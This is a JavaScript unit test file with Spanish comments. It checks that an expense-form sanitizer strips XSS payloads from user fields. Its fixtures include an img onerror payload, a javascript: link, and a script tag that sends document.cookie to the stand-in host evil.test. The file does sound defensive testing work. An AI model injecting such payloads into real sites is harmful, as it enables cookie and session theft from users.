/**
 * @fileoverview Test de integración de sanitización XSS en el flujo de gastos.
 *
 * Verifica que un payload malicioso escrito por el usuario en 'concept' o
 * 'description' del formulario de gastos NUNCA llega intacto al objeto que
 * finalmente se envía a addExpense/updateFinancialRecord.
 */
import { sanitizeExpenseFormData } from '@/lib/sanitize-expense';

describe('sanitizeExpenseFormData (integración XSS)', () => {
  it('elimina un payload de <img onerror> en la descripción', () => {
    const malicious = '<img src=x onerror=alert(1)>Reparación de frenos';
    const result = sanitizeExpenseFormData({
      items: [{ concept: 'Frenos', amount: 500 }],
      description: malicious,
    });

    expect(result.description).not.toContain('onerror');
    expect(result.description).not.toContain('<img');
    expect(result.description).toContain('Reparación de frenos');
  });

  it('elimina un payload de <script> en el concepto de una línea de gasto', () => {
    const malicious = '<script>fetch("https://evil.test?c="+document.cookie)</script>Aceite';
    const result = sanitizeExpenseFormData({
      items: [{ concept: malicious, amount: 300 }],
      description: '',
    });

    expect(result.items[0].concept).not.toContain('<script>');
    expect(result.items[0].concept).not.toContain('evil.test');
    expect(result.items[0].concept).toContain('Aceite');
  });

  it('sanitiza cada línea cuando hay múltiples items, algunos limpios y otros no', () => {
    const result = sanitizeExpenseFormData({
      items: [
        { concept: 'Llantas', amount: 1200 },
        { concept: '<a href="javascript:alert(document.domain)">Alineación</a>', amount: 400 },
      ],
      description: 'Servicio completo',
    });

    expect(result.items[0].concept).toBe('Llantas');
    expect(result.items[1].concept).not.toContain('javascript:');
    expect(result.items[1].concept).toContain('Alineación');
    expect(result.description).toBe('Servicio completo');
  });

  it('deja description como undefined si viene vacía, en vez de forzar un string', () => {
    const result = sanitizeExpenseFormData({
      items: [{ concept: 'Gasto', amount: 100 }],
      description: '',
    });
    expect(result.description).toBeUndefined();
  });

  it('no muta el objeto de entrada original', () => {
    const original = {
      items: [{ concept: '<b>negrita</b>', amount: 100 }],
      description: '<i>cursiva</i>',
    };
    const snapshot = JSON.parse(JSON.stringify(original));
    sanitizeExpenseFormData(original);
    expect(original).toEqual(snapshot);
  });

  it('preserva campos ajenos a la sanitización (categoryId, vehicleId, etc.)', () => {
    const result = sanitizeExpenseFormData({
      items: [{ concept: 'Gasto', amount: 100 }],
      description: 'ok',
      categoryId: 'cat-123',
      vehicleId: 'veh-456',
    });
    expect(result.categoryId).toBe('cat-123');
    expect(result.vehicleId).toBe('veh-456');
  });
});
